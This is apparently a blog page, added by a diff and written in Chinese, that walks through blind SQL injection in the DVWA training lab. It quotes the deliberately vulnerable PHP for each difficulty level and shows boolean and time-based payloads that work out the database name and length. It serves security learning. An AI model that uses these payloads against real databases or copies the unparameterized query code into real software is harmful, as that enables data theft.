@@ -1,0 +1,175 @@
+<h1 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection(Blind)"></a>SQL Injection(Blind)</h1><p>盲注分为基于布尔的盲注，基于时间的盲注和基于报错的盲注，盲注同样是因为输入的语句未经规范和过滤，造成了原有的sql语句结构改变，但不同与sql injection的是，盲注漏洞只能返回yes /no。</p>
+<pre><code>1.判断是否存在注入，注入是字符型还是数字型
+
+2.猜解当前数据库名
+
+3.猜解数据库中的表名
+
+4.猜解表中的字段名
+
+5.猜解数据</code></pre><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><pre><code>&lt;?php
+
+if( isset( $_GET[ &apos;Submit&apos; ] ) ) {
+    // Get input
+    $id = $_GET[ &apos;id&apos; ];
+
+    // Check database
+    $getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;;
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $getid ); // Removed &apos;or die&apos; to suppress mysql errors
+
+    // Get results
+    $num = @mysqli_num_rows( $result ); // The &apos;@&apos; character suppresses errors
+    if( $num &gt; 0 ) {
+        // Feedback for end user
+        echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;;
+    }
+    else {
+        // User wasn&apos;t found, so the page wasn&apos;t!
+        header( $_SERVER[ &apos;SERVER_PROTOCOL&apos; ] . &apos; 404 Not Found&apos; );
+
+        // Feedback for end user
+        echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;;
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
+}
+
+?&gt; </code></pre><p>审计可知，Low等级对输入没有做任何过滤，可以直接注入</p>
+<p>（以下yes代表返回为User ID exists in the database，no代表User ID is MISSING from the database)</p>
+<h3 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h3><p>（1)判断注入点及注入类型</p>
+<pre><code>1                                        #yes
+1&apos;                                        #no
+1 or 1=1                                #无显示
+1&apos;or&apos;1&apos;=&apos;1                                #yes
+1&apos;or&apos;1&apos;=&apos;1&apos;#                            #yes</code></pre><p>证明存在字符型注入</p>
+<p>（2）猜数据库长度</p>
+<pre><code>1&apos; and length(database())=1 #            #no
+1&apos; and length(database())=2 #            #no
+1&apos; and length(database())=3 #            #no
+1&apos; and length(database())=4 #            #yes
+1&apos; and length(database())=5 #            #no</code></pre><p>证明数据库长度为4</p>
+<p>（3）猜数据库名（一个字母一个字母的来）</p>
+<p>二分法(推荐）或遍历</p>
+<p>最好利用python写脚本实现</p>
+<p>下列只展示yes过程</p>
+<pre><code>遍历法
+1&apos; and substr(database(),1,1)=&apos;d&apos;#     
+1&apos; and substr(database(),2,1)=&apos;v&apos;#
+1&apos; and substr(database(),3,1)=&apos;w&apos;#
+1&apos; and substr(database(),4,1)=&apos;v&apos;#
+二分法
+1&apos; and ascii(substr(database(),1,1))&lt;100 #
+1&apos; and ascii(substr(database(),1,1))&gt;100 #
+1&apos; and ascii(substr(database(),2,1))&lt;118 #
+1&apos; and ascii(substr(database(),2,1))&gt;118 #
+1&apos; and ascii(substr(database(),1,1))&lt;119 #
+1&apos; and ascii(substr(database(),1,1))&gt;119
+1&apos; and ascii(substr(database(),1,1))&lt;97 #
+1&apos; and ascii(substr(database(),1,1))&gt;97 #</code></pre><p>（4）猜表</p>
+<p>猜数量</p>
+<p>猜第1<del>n个表名长度+猜第1</del>n个表名</p>
+<p>（5）猜列</p>
+<p>猜列数</p>
+<p>猜1~n个列名长度+猜列名</p>
+<h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><p>（1）判断注入是否存在及注入类型</p>
+<pre><code>1&apos; and sleep(5)#        #有明显延迟
+1 and sleep(5)#            #无延迟</code></pre><p>（2）猜数据库名长度</p>
+<p>猜数据库名</p>
+<p>（3）猜表数</p>
+<p>猜1~n表名长度和表名</p>
+<p>（4）猜列数</p>
+<p>猜1~n列名长度和列名</p>
+<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><pre><code>&lt;?php
+
+if( isset( $_POST[ &apos;Submit&apos; ]  ) ) {
+    // Get input
+    $id = $_POST[ &apos;id&apos; ];
+    $id = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $id ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+
+    // Check database
+    $getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $getid ); // Removed &apos;or die&apos; to suppress mysql errors
+
+    // Get results
+    $num = @mysqli_num_rows( $result ); // The &apos;@&apos; character suppresses errors
+    if( $num &gt; 0 ) {
+        // Feedback for end user
+        echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;;
+    }
+    else {
+        // Feedback for end user
+        echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;;
+    }
+
+    //mysql_close();
+}
+
+?&gt; </code></pre><p>限制了输入为下拉框，但可以通过抓包改参，因为是数字型注入，所以mysqli_real_escape_string没有用了</p>
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><pre><code>&lt;?php
+
+if( isset( $_COOKIE[ &apos;id&apos; ] ) ) {
+    // Get input
+    $id = $_COOKIE[ &apos;id&apos; ];
+
+    // Check database
+    $getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos; LIMIT 1;&quot;;
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $getid ); // Removed &apos;or die&apos; to suppress mysql errors
+
+    // Get results
+    $num = @mysqli_num_rows( $result ); // The &apos;@&apos; character suppresses errors
+    if( $num &gt; 0 ) {
+        // Feedback for end user
+        echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;;
+    }
+    else {
+        // Might sleep a random amount
+        if( rand( 0, 5 ) == 3 ) {
+            sleep( rand( 2, 4 ) );
+        }
+
+        // User wasn&apos;t found, so the page wasn&apos;t!
+        header( $_SERVER[ &apos;SERVER_PROTOCOL&apos; ] . &apos; 404 Not Found&apos; );
+
+        // Feedback for end user
+        echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;;
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
+}
+
+?&gt; </code></pre><p>企图限制长度为1,可以通过#给注释掉，同sql 注入</p>
+<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?php
+
+if( isset( $_GET[ &apos;Submit&apos; ] ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );
+
+    // Get input
+    $id = $_GET[ &apos;id&apos; ];
+
+    // Was a number entered?
+    if(is_numeric( $id )) {
+        // Check the database
+        $data = $db-&gt;prepare( &apos;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&apos; );
+        $data-&gt;bindParam( &apos;:id&apos;, $id, PDO::PARAM_INT );
+        $data-&gt;execute();
+
+        // Get results
+        if( $data-&gt;rowCount() == 1 ) {
+            // Feedback for end user
+            echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;;
+        }
+        else {
+            // User wasn&apos;t found, so the page wasn&apos;t!
+            header( $_SERVER[ &apos;SERVER_PROTOCOL&apos; ] . &apos; 404 Not Found&apos; );
+
+            // Feedback for end user
+            echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;;
+        }
+    }
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt; </code></pre>
